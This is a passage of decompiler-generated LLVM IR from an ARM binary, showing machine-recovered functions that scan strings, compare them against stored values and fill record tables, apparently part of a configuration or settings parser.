  uselistorder label %dec_label_pc_1bfb0, { 1, 0 }
  uselistorder label %dec_label_pc_1bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_1bf2c, { 1, 0 }
  uselistorder label %dec_label_pc_1bf04, { 1, 0 }
  uselistorder label %dec_label_pc_1be50, { 1, 0, 2 }
  uselistorder label %bb219, { 1, 0 }
  uselistorder label %dec_label_pc_1bcac, { 1, 0 }
  uselistorder label %dec_label_pc_1bc70, { 1, 0 }
  uselistorder label %bb217, { 1, 0 }
}

define i32 @function_1c280(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1c280:
  %v0_1c280 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c280, label %.thread6, label %.thread13

.thread6:                                         ; preds = %dec_label_pc_1c280
  call void @llvm.trap()
  unreachable

.thread13:                                        ; preds = %dec_label_pc_1c280
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @function_1c2bc() local_unnamed_addr {
dec_label_pc_1c2bc:
  store i32 1524, i32* @lr, align 4
  store i32 180260, i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @function_1c310(i8* %arg1) local_unnamed_addr {
dec_label_pc_1c310:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1c314 = load i32, i32* @r4, align 4
  store i32 %v3_1c314, i32* %stack_var_-8, align 4
  store i32 180260, i32* @ip, align 4
  store i32 1524, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1c324.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1c3249 = inttoptr i32 %v0_1c324.pre to i8*
  %v2_1c32410 = load i8, i8* %v1_1c3249, align 1
  %v2_1c32812 = icmp eq i8 %v2_1c32410, 0
  store i1 %v2_1c32812, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c32812, label %dec_label_pc_1c358, label %dec_label_pc_1c334

dec_label_pc_1c334:                               ; preds = %dec_label_pc_1c310, %bb8.dec_label_pc_1c334_crit_edge
  %v1_1c334 = phi i32 [ %v1_1c334.pre, %bb8.dec_label_pc_1c334_crit_edge ], [ 1524, %dec_label_pc_1c310 ]
  %v0_1c334 = phi i32 [ %v0_1c334.pre, %bb8.dec_label_pc_1c334_crit_edge ], [ 180260, %dec_label_pc_1c310 ]
  %v2_1c32416 = phi i8 [ %v2_1c324, %bb8.dec_label_pc_1c334_crit_edge ], [ %v2_1c32410, %dec_label_pc_1c310 ]
  %v2_1c32c17.in.in = phi i8 [ %v2_1c324, %bb8.dec_label_pc_1c334_crit_edge ], [ %v2_1c32410, %dec_label_pc_1c310 ]
  %v1_1c32415 = phi i8* [ %v1_1c324, %bb8.dec_label_pc_1c334_crit_edge ], [ %v1_1c3249, %dec_label_pc_1c310 ]
  %v2_1c34c14 = phi i32 [ %v2_1c350, %bb8.dec_label_pc_1c334_crit_edge ], [ %v0_1c324.pre, %dec_label_pc_1c310 ]
  %v2_1c32c17.in = zext i8 %v2_1c32c17.in.in to i32
  %v2_1c32c17 = mul nuw nsw i32 %v2_1c32c17.in, 2
  %v2_1c334 = add i32 %v1_1c334, %v0_1c334
  %v3_1c334 = inttoptr i32 %v2_1c334 to i32*
  %v4_1c334 = load i32, i32* %v3_1c334, align 4
  %v2_1c338 = add i32 %v4_1c334, %v2_1c32c17
  %v3_1c338 = inttoptr i32 %v2_1c338 to i16*
  %v4_1c338 = load i16, i16* %v3_1c338, align 2
  %v1_1c33c = and i16 %v4_1c338, 32
  %v2_1c33c = icmp eq i16 %v1_1c33c, 0
  store i1 %v2_1c33c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c33c, label %dec_label_pc_1c358, label %dec_label_pc_1c344

dec_label_pc_1c344:                               ; preds = %dec_label_pc_1c334
  %v7_1c344 = icmp eq i8 %v2_1c32416, 35
  br i1 %v7_1c344, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1c344
  %v8_1c348 = icmp eq i8 %v2_1c32416, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_1c344, %bb
  %storemerge = phi i1 [ %v8_1c348, %bb ], [ %v7_1c344, %dec_label_pc_1c344 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_1c34c = load i32, i32* %lr.global-to-local, align 4
  %v1_1c34c = trunc i32 %v0_1c34c to i8
  store i8 %v1_1c34c, i8* %v1_1c32415, align 1
  %v0_1c350 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1c35c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_1c350, label %dec_label_pc_1c358, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1c350 = add i32 %v1_1c35c.pre, 1
  store i32 %v2_1c350, i32* %r0.global-to-local, align 4
  %v1_1c324 = inttoptr i32 %v2_1c350 to i8*
  %v2_1c324 = load i8, i8* %v1_1c324, align 1
  %v2_1c328 = icmp eq i8 %v2_1c324, 0
  store i1 %v2_1c328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c328, label %dec_label_pc_1c358, label %bb8.dec_label_pc_1c334_crit_edge

bb8.dec_label_pc_1c334_crit_edge:                 ; preds = %bb8
  %v0_1c334.pre = load i32, i32* @ip, align 4
  %v1_1c334.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c334

dec_label_pc_1c358:                               ; preds = %bb8, %dec_label_pc_1c334, %bb7, %dec_label_pc_1c310
  %v1_1c35c = phi i32 [ %v0_1c324.pre, %dec_label_pc_1c310 ], [ %v1_1c35c.pre, %bb7 ], [ %v2_1c34c14, %dec_label_pc_1c334 ], [ %v2_1c350, %bb8 ]
  %v2_1c358 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1c358, i32* @r4, align 4
  ret i32 %v1_1c35c

; uselistorder directives
  uselistorder i8 %v2_1c324, { 2, 1, 0 }
  uselistorder i8* %v1_1c324, { 1, 0 }
  uselistorder i32 %v2_1c350, { 0, 2, 3, 1 }
  uselistorder i1 %v2_1c33c, { 1, 0 }
  uselistorder i8 %v2_1c32416, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 2, 0, 3, 1 }
  uselistorder i16 0, { 0, 8, 1, 2, 9, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 1524, { 0, 3, 4, 5, 6, 2, 1, 7 }
  uselistorder label %dec_label_pc_1c358, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_1c334, { 1, 0 }
}

define i32 @function_1c368() local_unnamed_addr {
dec_label_pc_1c368:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i8*, align 4
  %v3_1c368 = load i32, i32* @r4, align 4
  %v15_1c368 = load i32, i32* @r8, align 4
  %v18_1c368 = load i32, i32* @sb, align 4
  %v21_1c368 = load i32, i32* @sl, align 4
  %v24_1c368 = load i32, i32* @fp, align 4
  store i32 28336, i32* %r3.global-to-local, align 4
  store i32 180260, i32* @r5, align 4
  %v4_1c378 = load i32, i32* @global_var_32ed4.1117, align 4
  store i32 %v4_1c378, i32* @r4, align 4
  %v2_1c37c = icmp eq i32 %v4_1c378, 0
  br i1 %v2_1c37c, label %dec_label_pc_1c388, label %dec_label_pc_1c3b8

dec_label_pc_1c388:                               ; preds = %dec_label_pc_1c368
  %v2_1c38c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1c38c, i32* %r1.global-to-local, align 4
  %v3_1c394 = call i32 @function_1cc4c(i32 ptrtoint ([17 x i8]* @global_var_23cd8.1119 to i32), i32 %v2_1c38c)
  %v2_1c398 = icmp eq i32 %v3_1c394, 0
  %v1_1c39c = load i32, i32* @r4, align 4
  %.v1_1c39c = select i1 %v2_1c398, i32 %tmp46, i32 %v1_1c39c
  store i32 27332, i32* %r1.global-to-local, align 4
  store i32 %.v1_1c39c, i32* %r2.global-to-local, align 4
  %v4_1c3a8 = load i32, i32* @global_var_32ae8.1121, align 4
  store i32 %v4_1c3a8, i32* %r3.global-to-local, align 4
  %v9_1c3ac = icmp eq i32 %v4_1c3a8, %.v1_1c39c
  br i1 %v9_1c3ac, label %.thread, label %dec_label_pc_1c7c4

.thread:                                          ; preds = %dec_label_pc_1c388
  store i32 115640, i32* @lr, align 4
  br label %dec_label_pc_1c3b8

dec_label_pc_1c3b8:                               ; preds = %.thread, %dec_label_pc_1c368
  %v4_1c3bc = load i32, i32* @global_var_32ee0.1105, align 4
  store i32 %v4_1c3bc, i32* %r3.global-to-local, align 4
  %v2_1c3c0 = icmp eq i32 %v4_1c3bc, 0
  br i1 %v2_1c3c0, label %dec_label_pc_1c3c8, label %dec_label_pc_1c75c

dec_label_pc_1c3c8:                               ; preds = %dec_label_pc_1c3b8
  %v2_1c3d0 = load i32, i32* @r5, align 4
  %v4_1c3d0 = add i32 %v2_1c3d0, 2122
  %v5_1c3d0 = inttoptr i32 %v4_1c3d0 to i8*
  store i8 5, i8* %v5_1c3d0, align 1
  store i32 2123, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v3_1c3e4 = load i32, i32* @r5, align 4
  %v6_1c3e4 = add i32 %v3_1c3e4, 2123
  %v7_1c3e4 = inttoptr i32 %v6_1c3e4 to i8*
  store i8 3, i8* %v7_1c3e4, align 1
  store i32 ptrtoint ([17 x i8]* @global_var_23cd8.1119 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2390c.969 to i32), i32* @r1, align 4
  %v7_1c3f0 = call i32 @function_180d4(i32 ptrtoint ([17 x i8]* @global_var_23cd8.1119 to i32), i32 ptrtoint (i32* @global_var_2390c.969 to i32), i32 3, i32 2123)
  store i32 %v7_1c3f0, i32* @fp, align 4
  %v2_1c3f4 = icmp eq i32 %v7_1c3f0, 0
  br i1 %v2_1c3f4, label %dec_label_pc_1c680, label %dec_label_pc_1c628

dec_label_pc_1c400:                               ; preds = %dec_label_pc_1c628, %dec_label_pc_1c65c.backedge
  %v2_1c404 = call i32 @function_1c310(i8* %v1_1c404)
  store i32 %v2_1c404, i32* @r4, align 4
  %v0_1c40c = call i32 @function_1c2bc()
  %v1_1c410 = inttoptr i32 %v0_1c40c to i8*
  %v2_1c410 = call i32 @function_1c310(i8* %v1_1c410)
  store i32 ptrtoint ([11 x i8]* @global_var_23cec.1133 to i32), i32* @r1, align 4
  store i32 %v2_1c410, i32* @r7, align 4
  %v0_1c41c = load i32, i32* @r4, align 4
  %v3_1c420 = inttoptr i32 %v0_1c41c to i8*
  %v4_1c420 = call i32 @function_13fe0(i8* %v3_1c420, i32 ptrtoint ([11 x i8]* @global_var_23cec.1133 to i32))
  %sext = mul i32 %v4_1c420, 16777216
  %v1_1c424 = sdiv i32 %sext, 16777216
  store i32 %v1_1c424, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_1c42c, label %dec_label_pc_1c4e8

dec_label_pc_1c42c:                               ; preds = %dec_label_pc_1c400
  %v0_1c430 = call i32 @function_1c2bc()
  %v1_1c430 = inttoptr i32 %v0_1c430 to i8*
  store i32 %v2_1c434, i32* @r4, align 4
  %v0_1c438 = load i32, i32* @r6, align 4
  %v1_1c438 = trunc i32 %v0_1c438 to i8
  store i8 %v1_1c438, i8* %v1_1c430, align 1
  %v0_1c43c = load i32, i32* @r6, align 4
  store i32 %v0_1c43c, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  %v3_1c448 = call i32 @function_13ed0(i8* %v2_1c448, i32 %v0_1c43c)
  %v0_1c450 = load i32, i32* @r7, align 4
  store i32 %v0_1c450, i32* %r1.global-to-local, align 4
  store i32 %v2_1c454, i32* %r2.global-to-local, align 4
  %v3_1c458 = inttoptr i32 %v0_1c450 to i8*
  %v4_1c458 = call i32 @function_1b3f8(i32 10, i8* %v3_1c458, i32 %v2_1c454)
  %tmp68 = icmp slt i32 %v4_1c458, 1
  br i1 %tmp68, label %dec_label_pc_1c468, label %dec_label_pc_1c484

dec_label_pc_1c468:                               ; preds = %dec_label_pc_1c42c
  %v0_1c468 = load i32, i32* @r7, align 4
  store i32 %v0_1c468, i32* %r1.global-to-local, align 4
  store i32 %v2_1c46c, i32* %r2.global-to-local, align 4
  %v3_1c474 = inttoptr i32 %v0_1c468 to i8*
  %v4_1c474 = call i32 @function_1b3f8(i32 2, i8* %v3_1c474, i32 %v2_1c46c)
  %tmp69 = icmp slt i32 %v4_1c474, 1
  br i1 %tmp69, label %dec_label_pc_1c65c.backedge, label %dec_label_pc_1c484

dec_label_pc_1c484:                               ; preds = %dec_label_pc_1c468, %dec_label_pc_1c42c
  %v0_1c488 = phi i8* [ inttoptr (i32 10 to i8*), %dec_label_pc_1c42c ], [ inttoptr (i32 2 to i8*), %dec_label_pc_1c468 ]
  store i32 %v2_1c484, i32* %r2.global-to-local, align 4
  store i8* %v0_1c488, i8** %stack_var_-68, align 4
  store i32 28348, i32* @r7, align 4
  %v4_1c498 = load i32, i32* @global_var_32ee0.1105, align 4
  store i32 28344, i32* @sl, align 4
  %v1_1c4a0 = add i32 %v4_1c498, 1
  store i32 %v1_1c4a0, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_1c4a8 = mul i32 %v1_1c4a0, 28
  store i32 %v2_1c4a8, i32* %r1.global-to-local, align 4
  %v4_1c4ac = load i32, i32* @global_var_32edc.1107, align 4
  %v2_1c4b0 = inttoptr i32 %v4_1c4ac to i32*
  %v3_1c4b0 = call i32 @function_1a744(i32* %v2_1c4b0, i32 %v2_1c4a8)
  store i32 %v3_1c4b0, i32* @r6, align 4
  %v2_1c4b4 = icmp eq i32 %v3_1c4b0, 0
  br i1 %v2_1c4b4, label %dec_label_pc_1c65c.backedge, label %dec_label_pc_1c4bc

dec_label_pc_1c4bc:                               ; preds = %dec_label_pc_1c484
  %v4_1c4bc = load i32, i32* @global_var_32ee0.1105, align 4
  store i32 %v4_1c4bc, i32* %r4.global-to-local, align 4
  %v1_1c4c0 = load i32, i32* @r8, align 4
  %v3_1c4c0 = mul i32 %v1_1c4c0, %v4_1c4bc
  %v4_1c4c0 = add i32 %v3_1c4c0, %v3_1c4b0
  %v2_1c4c8 = load i8*, i8** %stack_var_-68, align 4
  %v3_1c4c8 = ptrtoint i8* %v2_1c4c8 to i32
  %v6_1c4c8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_1c4c8, i32* %r1.global-to-local, align 4
  %v9_1c4c8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_1c4c8, i32* %r2.global-to-local, align 4
  store i32 %v14_1c4c8, i32* @ip, align 4
  store i32 %v3_1c4b0, i32* @global_var_32edc.1107, align 4
  %v1_1c4d0 = inttoptr i32 %v4_1c4c0 to i32*
  store i32 %v3_1c4c8, i32* %v1_1c4d0, align 4
  %v3_1c4d0 = add i32 %v4_1c4c0, 4
  %v4_1c4d0 = inttoptr i32 %v3_1c4d0 to i32*
  %v5_1c4d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c4d0, i32* %v4_1c4d0, align 4
  %v6_1c4d0 = add i32 %v4_1c4c0, 8
  %v7_1c4d0 = inttoptr i32 %v6_1c4d0 to i32*
  %v8_1c4d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1c4d0, i32* %v7_1c4d0, align 4
  %v9_1c4d0 = add i32 %v4_1c4c0, 12
  %v10_1c4d0 = inttoptr i32 %v9_1c4d0 to i32*
  %v11_1c4d0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1c4d0, i32* %v10_1c4d0, align 4
  %v12_1c4d0 = add i32 %v4_1c4c0, 16
  store i32 %v12_1c4d0, i32* @lr, align 4
  %v2_1c4d4 = load i32, i32* %stack_var_-52, align 4
  %v0_1c4d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c4d8 = add i32 %v0_1c4d8, 1
  store i32 %v1_1c4d8, i32* %r4.global-to-local, align 4
  %v1_1c4dc = inttoptr i32 %v12_1c4d0 to i32*
  store i32 %v2_1c4d4, i32* %v1_1c4dc, align 4
  %v3_1c4dc = add i32 %v4_1c4c0, 20
  %v4_1c4dc = inttoptr i32 %v3_1c4dc to i32*
  %v5_1c4dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c4dc, i32* %v4_1c4dc, align 4
  %v6_1c4dc = add i32 %v4_1c4c0, 24
  %v7_1c4dc = inttoptr i32 %v6_1c4dc to i32*
  %v8_1c4dc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1c4dc, i32* %v7_1c4dc, align 4
  %v0_1c4e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1c4e0, i32* @global_var_32ee0.1105, align 4
  br label %dec_label_pc_1c65c.backedge

dec_label_pc_1c65c.backedge:                      ; preds = %dec_label_pc_1c584, %dec_label_pc_1c574, %dec_label_pc_1c540, %dec_label_pc_1c4bc, %dec_label_pc_1c614, %dec_label_pc_1c468, %dec_label_pc_1c484, %dec_label_pc_1c5bc, %dec_label_pc_1c5c4, %dec_label_pc_1c5a8, %dec_label_pc_1c5f8
  %v0_1c668.pre = load i32, i32* @fp, align 4
  store i32 %v2_1c65c, i32* @r4, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_1c668.pre, i32* %r2.global-to-local, align 4
  %v3_1c66c = call i32 @function_1929c(i32 %v2_1c65c, i32 128, i32 %v0_1c668.pre)
  %v2_1c670 = icmp eq i32 %v3_1c66c, 0
  br i1 %v2_1c670, label %dec_label_pc_1c678, label %dec_label_pc_1c400

dec_label_pc_1c4e8:                               ; preds = %dec_label_pc_1c400
  %v0_1c4e8 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_23cf8.1135 to i32), i32* @r1, align 4
  %v3_1c4f0 = inttoptr i32 %v0_1c4e8 to i8*
  %v4_1c4f0 = call i32 @function_13fe0(i8* %v3_1c4f0, i32 ptrtoint ([7 x i8]* @global_var_23cf8.1135 to i32))
  %v2_1c4f4 = icmp eq i32 %v4_1c4f0, 0
  br i1 %v2_1c4f4, label %dec_label_pc_1c528, label %dec_label_pc_1c4fc

dec_label_pc_1c4fc:                               ; preds = %dec_label_pc_1c4e8
  %v0_1c4fc = load i32, i32* @r4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_23d00.1137 to i32), i32* @r1, align 4
  %v3_1c504 = inttoptr i32 %v0_1c4fc to i8*
  %v4_1c504 = call i32 @function_13fe0(i8* %v3_1c504, i32 ptrtoint ([7 x i8]* @global_var_23d00.1137 to i32))
  %v2_1c508 = icmp eq i32 %v4_1c504, 0
  br i1 %v2_1c508, label %dec_label_pc_1c528, label %dec_label_pc_1c5a8

dec_label_pc_1c514:                               ; preds = %dec_label_pc_1c528, %dec_label_pc_1c514.dec_label_pc_1c514_crit_edge
  %v2_1c518 = phi i32 [ %v1_1c52c, %dec_label_pc_1c514.dec_label_pc_1c514_crit_edge ], [ %v1_1c52c16, %dec_label_pc_1c528 ]
  %v0_1c518 = phi i32 [ %v1_1c534, %dec_label_pc_1c514.dec_label_pc_1c514_crit_edge ], [ %v1_1c53423, %dec_label_pc_1c528 ]
  %v1_1c514 = phi i32 [ %v1_1c514.pre, %dec_label_pc_1c514.dec_label_pc_1c514_crit_edge ], [ 28340, %dec_label_pc_1c528 ]
  %v1_1c518 = phi i32 [ %v0_1c52c, %dec_label_pc_1c514.dec_label_pc_1c514_crit_edge ], [ %v0_1c52c15, %dec_label_pc_1c528 ]
  %v2_1c514 = add i32 %v1_1c518, %v1_1c514
  %v3_1c514 = inttoptr i32 %v2_1c514 to i32*
  %v4_1c514 = load i32, i32* %v3_1c514, align 4
  store i32 %v4_1c514, i32* %r3.global-to-local, align 4
  %v3_1c518 = add i32 %v1_1c518, %v2_1c518
  %v4_1c518 = inttoptr i32 %v3_1c518 to i32*
  store i32 %v0_1c518, i32* %v4_1c518, align 4
  %v0_1c51c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c51c = load i32, i32* %r2.global-to-local, align 4
  %v4_1c51c = mul i32 %v1_1c51c, 4
  %v5_1c51c = add i32 %v4_1c51c, %v0_1c51c
  %v6_1c51c = inttoptr i32 %v5_1c51c to i32*
  %v7_1c51c = load i32, i32* %v6_1c51c, align 4
  store i32 %v7_1c51c, i32* @r0, align 4
  %v0_1c520 = call i32 @function_15850()
  %v0_1c52c = load i32, i32* @r5, align 4
  %v1_1c52c = load i32, i32* @sb, align 4
  %v2_1c52c = add i32 %v1_1c52c, %v0_1c52c
  %v3_1c52c = inttoptr i32 %v2_1c52c to i32*
  %v4_1c52c = load i32, i32* %v3_1c52c, align 4
  store i32 %v4_1c52c, i32* %r3.global-to-local, align 4
  %v2_1c530 = icmp eq i32 %v4_1c52c, 0
  %v1_1c534 = add i32 %v4_1c52c, -1
  store i32 %v1_1c534, i32* %r2.global-to-local, align 4
  br i1 %v2_1c530, label %dec_label_pc_1c53c, label %dec_label_pc_1c514.dec_label_pc_1c514_crit_edge

dec_label_pc_1c514.dec_label_pc_1c514_crit_edge:  ; preds = %dec_label_pc_1c514
  %v1_1c514.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1c514

dec_label_pc_1c528:                               ; preds = %dec_label_pc_1c4fc, %dec_label_pc_1c4e8
  store i32 28340, i32* @r4, align 4
  %v0_1c52c15 = load i32, i32* @r5, align 4
  %v1_1c52c16 = load i32, i32* @sb, align 4
  %v2_1c52c17 = add i32 %v1_1c52c16, %v0_1c52c15
  %v3_1c52c18 = inttoptr i32 %v2_1c52c17 to i32*
  %v4_1c52c19 = load i32, i32* %v3_1c52c18, align 4
  store i32 %v4_1c52c19, i32* %r3.global-to-local, align 4
  %v2_1c53021 = icmp eq i32 %v4_1c52c19, 0
  %v1_1c53423 = add i32 %v4_1c52c19, -1
  store i32 %v1_1c53423, i32* %r2.global-to-local, align 4
  br i1 %v2_1c53021, label %dec_label_pc_1c53c, label %dec_label_pc_1c514

dec_label_pc_1c53c:                               ; preds = %dec_label_pc_1c514, %dec_label_pc_1c528
  store i32 28340, i32* @r6, align 4
  br label %dec_label_pc_1c540

dec_label_pc_1c540:                               ; preds = %dec_label_pc_1c584, %dec_label_pc_1c53c
  %v0_1c544 = call i32 @function_1c2bc()
  %v1_1c548 = inttoptr i32 %v0_1c544 to i8*
  %v2_1c548 = call i32 @function_1c310(i8* %v1_1c548)
  %v0_1c54c = load i32, i32* @r5, align 4
  %v1_1c54c = load i32, i32* @sb, align 4
  %v2_1c54c = add i32 %v1_1c54c, %v0_1c54c
  %v3_1c54c = inttoptr i32 %v2_1c54c to i32*
  %v4_1c54c = load i32, i32* %v3_1c54c, align 4
  store i32 %v2_1c548, i32* @r4, align 4
  %tmp86 = mul i32 %v4_1c54c, 4
  %v3_1c558 = add i32 %tmp86, 4
  store i32 %v3_1c558, i32* %r1.global-to-local, align 4
  %v4_1c55c = load i8, i8* @global_var_32ed8.1102, align 1
  %v5_1c55c = sext i8 %v4_1c55c to i32
  %v3_1c560 = inttoptr i32 %v5_1c55c to i32*
  %v4_1c560 = call i32 @function_1a744(i32* %v3_1c560, i32 %v3_1c558)
  store i32 %v4_1c560, i32* %r3.global-to-local, align 4
  %v2_1c564 = icmp eq i32 %v4_1c560, 0
  %v0_1c568 = load i32, i32* @r7, align 4
  %v0_1c56c = load i32, i32* @r4, align 4
  store i32 %v0_1c56c, i32* @r7, align 4
  br i1 %v2_1c564, label %dec_label_pc_1c65c.backedge, label %dec_label_pc_1c574

dec_label_pc_1c574:                               ; preds = %dec_label_pc_1c540
  %v5_1c574 = trunc i32 %v4_1c560 to i8
  store i8 %v5_1c574, i8* @global_var_32ed8.1102, align 4
  %v1_1c578 = call i32 @function_1cd20(i32 %v0_1c568)
  %v2_1c57c = icmp eq i32 %v1_1c578, 0
  br i1 %v2_1c57c, label %dec_label_pc_1c65c.backedge, label %dec_label_pc_1c584

dec_label_pc_1c584:                               ; preds = %dec_label_pc_1c574
  %v0_1c584 = load i32, i32* @r5, align 4
  %v1_1c584 = load i32, i32* @sb, align 4
  %v2_1c584 = add i32 %v1_1c584, %v0_1c584
  %v3_1c584 = inttoptr i32 %v2_1c584 to i32*
  %v4_1c584 = load i32, i32* %v3_1c584, align 4
  store i32 %v4_1c584, i32* %r3.global-to-local, align 4
  %v4_1c588 = load i8, i8* @global_var_32ed8.1102, align 1
  %v5_1c588 = sext i8 %v4_1c588 to i32
  store i32 %v5_1c588, i32* %r2.global-to-local, align 4
  %v1_1c58c = add i32 %v4_1c584, 1
  store i32 %v1_1c58c, i32* %r1.global-to-local, align 4
  %v5_1c590 = mul i32 %v4_1c584, 4
  %v6_1c590 = add i32 %v5_1c588, %v5_1c590
  %v7_1c590 = inttoptr i32 %v6_1c590 to i32*
  store i32 %v1_1c578, i32* %v7_1c590, align 4
  %v0_1c594 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c594 = load i32, i32* @r5, align 4
  %v2_1c594 = load i32, i32* @sb, align 4
  %v3_1c594 = add i32 %v2_1c594, %v1_1c594
  %v4_1c594 = inttoptr i32 %v3_1c594 to i32*
  store i32 %v0_1c594, i32* %v4_1c594, align 4
  %v0_1c598 = load i32, i32* @r4, align 4
  %v1_1c598 = inttoptr i32 %v0_1c598 to i8*
  %v2_1c598 = load i8, i8* %v1_1c598, align 1
  %v3_1c598 = zext i8 %v2_1c598 to i32
  store i32 %v3_1c598, i32* %r3.global-to-local, align 4
  %v2_1c59c = icmp eq i8 %v2_1c598, 0
  br i1 %v2_1c59c, label %dec_label_pc_1c65c.backedge, label %dec_label_pc_1c540

dec_label_pc_1c5a8:                               ; preds = %dec_label_pc_1c4fc
  %v0_1c5a8 = load i32, i32* @r4, align 4
  %v2_1c5ac = load i8*, i8** %stack_var_-560, align 4
  %v3_1c5ac = ptrtoint i8* %v2_1c5ac to i32
  store i32 %v3_1c5ac, i32* @r1, align 4
  %v3_1c5b0 = inttoptr i32 %v0_1c5a8 to i8*
  %v4_1c5b0 = call i32 @function_13fe0(i8* %v3_1c5b0, i32 %v3_1c5ac)
  %sext6 = mul i32 %v4_1c5b0, 16777216
  %v1_1c5b4 = sdiv i32 %sext6, 16777216
  store i32 %v1_1c5b4, i32* @r4, align 4
  %sext6.off = or i32 %sext6, 16777215
  %tmp87 = icmp ult i32 %sext6.off, 33554431
  br i1 %tmp87, label %dec_label_pc_1c5bc, label %dec_label_pc_1c65c.backedge

dec_label_pc_1c5bc:                               ; preds = %dec_label_pc_1c5a8
  %v0_1c5bc = load i32, i32* @r7, align 4
  %v2_1c5bc = icmp eq i32 %v0_1c5bc, 0
  br i1 %v2_1c5bc, label %dec_label_pc_1c65c.backedge, label %dec_label_pc_1c5c4

dec_label_pc_1c5c4:                               ; preds = %dec_label_pc_1c5bc
  store i32 %v0_1c5bc, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1c5cc = call i32 @function_142f0(i32 %v0_1c5bc, i32 58)
  store i32 %v2_1c5cc, i32* @r6, align 4
  %v3_1c5d0 = icmp eq i32 %v2_1c5cc, 0
  br i1 %v3_1c5d0, label %dec_label_pc_1c65c.backedge, label %dec_label_pc_1c5d8

dec_label_pc_1c5d8:                               ; preds = %dec_label_pc_1c5c4
  %v0_1c5dc = load i32, i32* @r4, align 4
  %v1_1c5dc = trunc i32 %v0_1c5dc to i8
  %v3_1c5dc = inttoptr i32 %v2_1c5cc to i8*
  store i8 %v1_1c5dc, i8* %v3_1c5dc, align 1
  store i32 ptrtoint ([8 x i8]* @global_var_23d10.1129 to i32), i32* @r1, align 4
  %v0_1c5e4 = load i32, i32* @r7, align 4
  %v3_1c5e8 = inttoptr i32 %v0_1c5e4 to i8*
  %v4_1c5e8 = call i32 @function_13fe0(i8* %v3_1c5e8, i32 ptrtoint ([8 x i8]* @global_var_23d10.1129 to i32))
  %v2_1c5ec = icmp eq i32 %v4_1c5e8, 0
  br i1 %v2_1c5ec, label %dec_label_pc_1c614, label %dec_label_pc_1c5f8

dec_label_pc_1c5f8:                               ; preds = %dec_label_pc_1c5d8
  %v0_1c5fc = load i32, i32* @r7, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_23d18.1131 to i32), i32* @r1, align 4
  %v3_1c604 = inttoptr i32 %v0_1c5fc to i8*
  %v4_1c604 = call i32 @function_13fe0(i8* %v3_1c604, i32 ptrtoint ([9 x i8]* @global_var_23d18.1131 to i32))
  %v2_1c608 = icmp eq i32 %v4_1c604, 0
  br i1 %v2_1c608, label %dec_label_pc_1c614, label %dec_label_pc_1c65c.backedge

dec_label_pc_1c614:                               ; preds = %dec_label_pc_1c5f8, %dec_label_pc_1c5d8
  %storemerge = phi i32 [ 2122, %dec_label_pc_1c5d8 ], [ 2123, %dec_label_pc_1c5f8 ]
